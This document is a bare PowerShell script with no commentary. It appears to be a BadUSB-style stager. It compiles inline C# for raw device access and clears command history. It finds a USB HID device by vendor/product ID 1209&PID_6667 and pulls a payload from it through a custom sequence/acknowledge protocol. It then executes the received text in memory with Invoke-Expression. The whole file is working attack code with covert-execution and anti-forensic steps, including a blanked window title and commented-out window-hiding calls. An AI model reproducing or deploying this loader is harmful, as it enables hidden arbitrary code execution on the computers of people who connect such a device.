$ui = $Host.UI.RawUI
##$ui.ForegroundColor = $ui.BackgroundColor
Clear

$ui.WindowTitle=''
$M = 64
$cs = '
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace n {
	public class w {
		[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
		public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
		[DllImport(%user32.dll%)]
		public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
		[DllImport(%user32.dll%)]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		public static FileStream o(string fn) {
			return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
		}
	}
}
'.Replace('%',[char]34)
Add-Type -TypeDefinition $cs
$h = (Get-Process -Id $pid).MainWindowHandle
##$null = [n.w]::SetWindowPos($h, -2, 2000, 2000, 40, 40, 5)

function bs($v, $n) { [math]::floor($v * [math]::pow(2, $n)) }
function sa($s,$a) { (bs ($s -band 15) 4) + ($a -band 15)}

& {
	clhy
	##$null = [n.w]::ShowWindowAsync($h, 0)
	$devs = gwmi Win32_USBControllerDevice
	foreach ($dev in $devs) {
		$wmidev = [wmi]$dev.Dependent
		if ($wmidev.GetPropertyValue('DeviceID') -match ('1209&PID_6667') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
			$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
		}
	}
	try {
		$f = [n.w]::o($fn)
		$seq = 0
		$ack = 0
		$ss = 0
		$flag = 1 #SYN
		$d = New-Object IO.MemoryStream
		while(1) {
			$b = New-Object Byte[]($M+1)
			$b[2] = $flag
			$b[3] = sa $seq $ack
			$f.Write($b, 0, $M+1)
			if ($flag -eq 6) {break} # We've sent the FIN/ACK
			$r = $f.Read($b, 0, $M+1)
			if ($b[1] -ne 0) { # Not channel 0
				$flag = 8 # RST
			} else {
				$ack = (bs $b[3] -4) + 1
				if ($b[2] -band 8) {       # RST
					$d = New-Object IO.MemoryStream
					$flag = 1
				} elseif ($b[2] -band 4) { # FIN
					$flag = 6                # FIN/ACK
					$seq++
				} elseif ($b[2] -band 2) { # SYN/ACK or ACK
					if ($b[2] -eq 3) {
						$ss = $b[3] -band 15
					} elseif (($ss+1) -band 15 -ne ($b[3] -band 15)) {
						[System.Console]::WriteLine("Incorrect sequence number!")
						exit
					} else {
						$d.Write($b,5,$b[4])
					}
					$flag = 2
				}
			}
		}
		IEx ([Text.Encoding]::ASCII).GetString($d.ToArray())
	} catch {
		echo $_.Exception|format-list -force
	}
	exit
}

